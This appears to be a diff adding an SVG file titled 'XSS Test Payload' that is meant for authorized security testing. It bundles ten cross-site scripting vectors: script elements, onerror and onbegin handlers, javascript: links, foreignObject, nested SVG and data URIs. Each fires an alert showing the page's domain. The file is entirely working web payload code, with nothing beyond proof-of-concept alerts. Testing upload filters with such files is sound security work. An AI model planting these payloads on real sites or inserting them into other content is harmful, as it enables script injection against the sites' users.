@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="500" height="300" version="1.1">
+  <title>XSS Test Payload</title>
+  <desc>SVG-based XSS execution vector for authorized security testing</desc>
+
+  <!-- Method 1: onload event on SVG root -->
+  <script type="text/javascript">
+    //<![CDATA[
+    alert('XSS via SVG onload: ' + document.domain);
+    console.log('SVG XSS executed:', window.location.href);
+    //]]>
+  </script>
+
+  <!-- Method 2: Image with onerror -->
+  <image x="10" y="10" width="100" height="100"
+         xlink:href="javascript:alert('XSS via image xlink:href')"
+         onerror="alert('XSS via onerror: ' + document.domain)" />
+
+  <!-- Method 3: ForeignObject with HTML script -->
+  <foreignObject x="120" y="10" width="200" height="100">
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <script>alert('XSS via foreignObject: ' + document.domain)</script>
+      <img src="x" onerror="alert('XSS via img onerror in foreignObject')">
+    </body>
+  </foreignObject>
+
+  <!-- Method 4: Animate with onbegin -->
+  <rect x="10" y="130" width="100" height="50" fill="red">
+    <animate attributeName="width" from="100" to="200" dur="1s"
+             onbegin="alert('XSS via animate onbegin: ' + document.domain)" />
+  </rect>
+
+  <!-- Method 5: Set with onbegin -->
+  <circle cx="200" cy="155" r="30" fill="blue">
+    <set attributeName="fill" to="green" begin="0s"
+         onbegin="alert('XSS via set onbegin: ' + document.domain)" />
+  </circle>
+
+  <!-- Method 6: Use xlink:href with javascript: -->
+  <a xlink:href="javascript:alert('XSS via a xlink:href: ' + document.domain)">
+    <text x="10" y="220" fill="black" font-size="14">Click me for XSS</text>
+  </a>
+
+  <!-- Method 7: Event handlers on shapes -->
+  <rect x="10" y="240" width="200" height="40" fill="yellow"
+        onclick="alert('XSS via onclick: ' + document.domain)"
+        onmouseover="console.log('Mouseover XSS')" />
+
+  <!-- Method 8: Script in desc/title (executes in some contexts) -->
+  <desc><![CDATA[<script>alert('XSS via desc')</script>]]></desc>
+
+  <!-- Method 9: Embed SVG in SVG with script -->
+  <svg x="220" y="130" width="150" height="100">
+    <script><![CDATA[alert('XSS via nested SVG: ' + document.domain)]]></script>
+    <circle cx="75" cy="50" r="40" fill="purple" />
+  </svg>
+
+  <!-- Method 10: Data URI with script -->
+  <image x="220" y="240" width="100" height="40"
+         xlink:href="data:text/html,<script>alert('XSS via data URI: ' + document.domain)</script>" />
+
+  <!-- Visual indicator -->
+  <text x="10" y="290" fill="black" font-size="12" font-family="monospace">
+    SVG XSS Payload - Authorized Testing Only
+  </text>
+</svg>
